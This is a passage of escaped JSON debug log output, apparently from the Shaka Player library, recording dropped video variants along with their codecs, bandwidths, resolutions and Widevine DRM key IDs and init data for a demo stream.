":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"517453862d4256fd8bad4f58422004d7\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true}\nDropping Variant (better codec\navailable){\"id\":42,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":24,\"originalId\":\"20\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1240},\"presentationTimeOffset\":0,\"mimeType\":\"video/mp4\",\"codecs\":\"avc1.4d401f\",\"frameRate\":24,\"bandwidth\":2625924,\"width\":1280,\"height\":546,\"encrypted\":true,\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":2761436,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true}\nDropping Variant (better codec\navailable){\"id\":43,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":25,\"originalId\":\"24\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1196},\"presentationTimeOffset\":0,\"mimeType\":\"video/mp4\",\"codecs\":\"avc1.4d401f\",\"frameRate\":24,\"bandwidth\":1458633,\"width\":1024,\"height\":436,\"encrypted\":true,\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":1594145,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true}\nDropping Variant (better codec\navailable){\"id\":44,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":26,\"originalId\":\"25\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1244},\"presentationTimeOffset\":0,\"mimeType\":\"video/mp4\",\"codecs\":\"avc1.640028\",\"frameRate\":24,\"bandwidth\":4719456,\"width\":1920,\"height\":818,\"encrypted\":true,\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":4854968,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true}\nDropping Variant (better codec\navailable){\"id\":47,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":29,\"originalId\":\"28\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1204},\"presentationTimeOffset\":0,\"mimeType\":\"video/mp4\",\"codecs\":\"avc1.640028\",\"frameRate\":24,\"bandwidth\":9263493,\"width\":2560,\"height\":1090,\"encrypted\":true,\"keyId\":\"4d4b0ca25ac158f0b9c1983c517ee2b5\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":9399005,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"4d4b0ca25ac158f0b9c1983c517ee2b5\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"4d4b0ca25ac158f0b9c1983c517ee2b5\",\"4d4b0ca25ac158f0b9c1983c517ee2b5\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true}\nDropping Variant (better codec\navailable){\"id\":48,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":30,\"originalId\":\"29\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1244},\"presentationTimeOffset\":0,\"mimeType\":\"video/mp4\",\"codecs\":\"avc1.640033\",\"frameRate\":24,\"bandwidth\":17629336,\"width\":3840,\"height\":1636,\"encrypted\":true,\"keyId\":\"4d4b0ca25ac158f0b9c1983c517ee2b5\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":17764848,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0